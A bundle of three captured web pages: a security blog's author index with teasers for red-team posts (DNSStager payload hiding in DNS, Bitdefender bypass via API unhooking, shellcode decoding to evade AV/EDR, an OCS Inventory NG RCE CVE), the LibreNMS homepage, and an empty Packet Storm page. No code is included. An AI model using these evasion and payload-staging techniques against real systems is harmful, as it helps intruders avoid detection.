## [DNSStager v1.0 stable: Stealthier code, DLL agent & much more](https://shells.systems/dnsstager-v1-0-stable-stealthier-code-dll-agent-much-more/)

Posted on 2022-02-012022-02-01 by [Askar](https://shells.systems/author/askar/)

[![DNSStager v1.0 stable: Stealthier code, DLL agent & much more](https://shells.systems/wp-content/uploads/2022/02/DNSStagerWorking.png)](https://shells.systems/dnsstager-v1-0-stable-stealthier-code-dll-agent-much-more/)

Estimated Reading Time:  3 minutes In the past year, I published the first version of DNSStager which is a tool to hide your payload in DNS, and presented an updated version of it at BlackHat Europe 2021 and @Hack conferences. Today I’m happy to announce that the Stable version of DNSStager is out with some new features and fixes for…

Categories[Red Team](https://shells.systems/category/red-team/)

## [Unveiling DNSStager: A tool to hide your payload in DNS](https://shells.systems/unveiling-dnsstager-a-tool-to-hide-your-payload-in-dns/)

Posted on 2021-05-232021-07-06 by [Askar](https://shells.systems/author/askar/)

[![Unveiling DNSStager: A tool to hide your payload in DNS](https://shells.systems/wp-content/uploads/2021/05/DNSStagerObservation.gif)](https://shells.systems/unveiling-dnsstager-a-tool-to-hide-your-payload-in-dns/)

Estimated Reading Time:  8 minutes In the past few weeks, I was working on a new project that could help me to solve an issue during a case I was facing, I needed a tool to help me pulling off my payload through DNS without being noisy or suspicious with the ability to inject this payload to the memory and…

Categories[Red Team](https://shells.systems/category/red-team/)

## [Unveiling BugHound: a static code analysis tool based on ElasticSearch](https://shells.systems/unveiling-bughound-a-static-code-analysis-tool-based-on-elasticsearch/)

Posted on 2021-01-242021-01-24 by [Askar](https://shells.systems/author/askar/)

[![Unveiling BugHound: a static code analysis tool based on ElasticSearch](https://shells.systems/wp-content/uploads/2021/01/Bughound-Logo.png)](https://shells.systems/unveiling-bughound-a-static-code-analysis-tool-based-on-elasticsearch/)

Estimated Reading Time:  7 minutes In the last couple of weeks, I was doing some code analysis for a couple of products, some of them were part of my daily job and the other was for research purposes. During this period, I was trying to do automation for my code analysis process to reduce the amount of work that I…

Categories[AppSec](https://shells.systems/category/appsec/), [static code analysis](https://shells.systems/category/static-code-analysis/)

## [Defeat Bitdefender total security using windows API unhooking to perform process injection](https://shells.systems/defeat-bitdefender-total-security-using-windows-api-unhooking-to-perform-process-injection/)

Posted on 2020-10-042020-10-04 by [Askar](https://shells.systems/author/askar/)

[![Defeat Bitdefender total security using windows API unhooking to perform process injection](https://shells.systems/wp-content/uploads/2020/10/CreateRemoteThread-reached-after-patch.png)](https://shells.systems/defeat-bitdefender-total-security-using-windows-api-unhooking-to-perform-process-injection/)

Estimated Reading Time:  14 minutes Bypassing endpoint protections such as AVs/EDRs is a phase that you need to take care of when you prepare for your red team operation, it could take some time to understand how these solutions are working before you try to bypass them. And with the large number of resources published online on this topic, it…

Categories[Red Team](https://shells.systems/category/red-team/)

## [Octopus v1.2 stable: shellcode generation, spoofed args agent & much more!](https://shells.systems/octopus-v1-2-stable-shellcode-generation-spoofed-args-agent-and-much-more/)

Posted on 2020-08-282020-08-28 by [Askar](https://shells.systems/author/askar/)

[![Octopus v1.2 stable: shellcode generation, spoofed args agent & much more!](https://shells.systems/wp-content/uploads/2020/08/Octopus-spoofed-args-results-2.png)](https://shells.systems/octopus-v1-2-stable-shellcode-generation-spoofed-args-agent-and-much-more/)

Estimated Reading Time:  4 minutes It’s been a while since I released the stable version of Octopus, and today, I’m glad to announce that version 1.2 from Octopus is out! We added new features to this version and fixed some issues from the previous one to make it more stable. With time going by, we noticed that Octopus usage is…

Categories[Red Team](https://shells.systems/category/red-team/)

## [In-Memory shellcode decoding to evade AVs/EDRs](https://shells.systems/in-memory-shellcode-decoding-to-evade-avs/)

Posted on 2020-07-262020-07-27 by [Askar](https://shells.systems/author/askar/)

[![In-Memory shellcode decoding to evade AVs/EDRs](https://shells.systems/wp-content/uploads/2020/07/Shellcode-Wrote-CreateRemoteThread.png)](https://shells.systems/in-memory-shellcode-decoding-to-evade-avs/)

Estimated Reading Time:  9 minutes During the previous week, I was doing some research about win32 APIs and how we can use them during weaponizing our attack, I already did some work related to process injection in the past, but I was looking for something more advanced and to do an extra mile in process injection. So, I took my…

Categories[Red Team](https://shells.systems/category/red-team/)

## [OCS Inventory NG v2.7 Remote Command Execution (CVE-2020-14947)](https://shells.systems/ocs-inventory-ng-v2-7-remote-command-execution-cve-2020-14947/)

Posted on 2020-06-292020-06-29 by [Askar](https://shells.systems/author/askar/)

[![OCS Inventory NG v2.7 Remote Command Execution (CVE-2020-14947)](https://shells.systems/wp-content/uploads/2020/06/OCS-final-exploit.png)](https://shells.systems/ocs-inventory-ng-v2-7-remote-command-execution-cve-2020-14947/)

Estimated Reading Time:  7 minutes Summary of OCS Inventory NG Open Computer and Software Inventory Next Generation is free software that enables users to inventory IT assets. OCS-NG collects information about the hardware and software of networked machines running the OCS client program. OCS can visualize the inventory through a web interface. About the exploit I found this vulnerability by…

Categories[static code analysis](https://shells.systems/category/static-code-analysis/)

[Older posts →](https://shells.systems/author/askar/page/2/)

[Proudly powered by WordPress](https://wordpress.org/)



=== Content from www.librenms.org_d2e6f2cd_20250126_042751.html ===


Toggle navigation

[![LibreNMS](/images/LibreNMS-Logo-Black.png)](#page-top)

* [Features](/#features)
* [Try](/#try)
* [Downloads](/#downloads)
* [Screenshots](/#screenshots)
* [Support](/#support)
* [Thanks](/#thanks)
* [Shop](/shop)
* [Docs](http://docs.librenms.org)

Welcome to LibreNMS, a fully featured network monitoring system that provides a wealth of features and device support.
[What can it do?](#features)

## Features

#### Automatic discovery

Automatically discover your entire network using CDP, FDP, LLDP, OSPF, BGP, SNMP and ARP.

#### Customisable alerting

Highly flexible alerting system, notify via email, irc, slack and more.

#### API Access

A full API to manage, graph and retrieve data from your install.

#### Billing system

Generate bandwidth bills for ports on your network based on usage or transfer.

#### Automatic Updates

Stay upto date automatically with bug fixes, new features and more.

#### Distributed Polling

Horizontal scaling to grow with your network.

#### iPhone App

Native iPhone App is available which provides core functionality.

#### Android App

Native Android App is available which provides core functionality..

---

More....

* Extensive device support
* Mobile friendly Web UI
* Unix Agent

Integration support for:

* [NfSen](http://nfsen.sourceforge.net/)
* [collectd](https://collectd.org/)
* [SmokePing](http://oss.oetiker.ch/smokeping/)
* [RANCID](http://www.shrubbery.net/rancid/)
* [Oxidized](https://github.com/ytti/oxidized/)

Multiple authentication methods:

* MySQL
* HTTP
* LDAP
* Radius
* Active Directory

## Try

Want to see what LibreNMS is all about?

An online demo is available for you to try before installing.

Open Demo

username: demo

password: demouser

## Downloads

### Ready to Install LibreNMS for your Network?

#### LibreNMS Documentation

* [LibreNMS Docs](https://docs.librenms.org/)
* [LibreNMS Installation Guides](https://docs.librenms.org/Installation/)
* [GitHub LibreNMS](https://github.com/librenms/librenms)

#### Centos / Ubuntu

* Support for both Apache and Nginx Web Servers
* [Installation Guide](https://docs.librenms.org/Installation/)

#### Docker Images

* Docker image documentation located on: [GitHub LibreNMS/Docker](https://github.com/librenms/docker)
* LibreNMS on: [dockerhub](https://hub.docker.com/r/librenms/librenms/)
* LibreNMS on: [QUAY](https://quay.io/repository/librenms/librenms)

## Screenshots

[![Device list](images/screenshots/screenshot_device_list.png)](images/screenshots/screenshot_device_list.png "Device list")
[![Add Device](images/screenshots/screenshot_add_device.png)](images/screenshots/screenshot_add_device.png "Add Device")
[![Traffic](images/screenshots/screenshot_port_bits.png)](images/screenshots/screenshot_port_bits.png "Traffic")
[![Disk Usage](images/screenshots/screenshot_disk_usage.png)](images/screenshots/screenshot_disk_usage.png "Disk Usage")
[![API Token](images/screenshots/screenshot_api_token.png)](images/screenshots/screenshot_api_token.png "API Token")
[![Distributed Pollers](images/screenshots/screenshot_distributed_pollers.png)](images/screenshots/screenshot_distributed_pollers.png "Distributed Pollers")
[![Alert Rules](images/screenshots/screenshot_alert_rules.png)](images/screenshots/screenshot_alert_rules.png "Alert Rules")
[![Alert Log](images/screenshots/screenshot_alert_log.png)](images/screenshots/screenshot_alert_log.png "Alert Log")

## Support

### We have a few ways to get in touch, the most responsive and widely used is our Discord server. Please only use GitHub issues for new devices. Feature requests and Bugs should be posted on our community forum.

[#### DiscordNo registration required](https://t.libren.ms/discord)
[#### Community Site](https://community.librenms.org)
[#### GitHub Issues](https://github.com/librenms/librenms/issues)

[#### Twitter @librenms](https://twitter.com/librenms)
[#### Online Docs](http://docs.librenms.org)
[#### FAQs](http://docs.librenms.org/Support/FAQ)

## Thanks!

Thanks to everyone that supports LibreNMS.

### Hosting Support

#### [Katapult](http://www.katapult.io)

Krystal is proud to help support LibreNMS with the Cloud services through our [Katapult](https://katapult.io) platform. With over 33,000 happy customers, Krystal provides a range of services from web hosting through dedicated servers to public cloud and more. With a 4.9/5 score on [Trustpilot](https://uk.trustpilot.com/review/krystal.uk), you're in safe hands when it comes to choosing a trusted partner to help you with your digital needs.

### Sponsors

Does your company use LibreNMS? Support its development [[Become a Sponsor]](https://opencollective.com/librenms#sponsor)

### Backers

Want to give back to the community? [[Become a Backer]](https://opencollective.com/librenms#backer)

### Special Mentions

#### [Wavedirect Telecommunications](http://www.wavedirect.net)

Wavedirect Telecommunications has been an Internet Service Provider since 2004 in the South Western region of Ontario and now Texas. We specialize in providing Internet to both urban and rural areas using wireless and cabled technology. We monitor and graph thousands of our customer and corporate devices through several programs. We found LibreNMS to be an excellent product to use with a friendly and supportive team . We helped the LibreNMS team develop support for our wireless devices and created a mobile app (IOS and Android) to help us monitor our network. We plan on supporting and working with the highly professional and skilled developers on the LibreNMS team for years to come.

Copyright © LibreNMS 2013 - 2024



=== Content from packetstormsecurity.com_f48e00db_20250124_232640.html ===

[![](/logos/smalllogobeta.png)](/)

* files
* news
* users
* cve

[![](/logos/smalllogobeta.png)](/)

* files
* news
* users
* cve

![](/logos/linegray.png)

 [About](/help/view/4) |
[Terms](/tos/) |
[Copyright](/help/view/7) |
[Privacy](/help/view/6) |
[BlueSky](https://bsky.app/profile/packetstorm.bsky.social) |
[X](https://x.com/packet_storm) |
[Mastodon](https://infosec.exchange/%40packet_storm/)


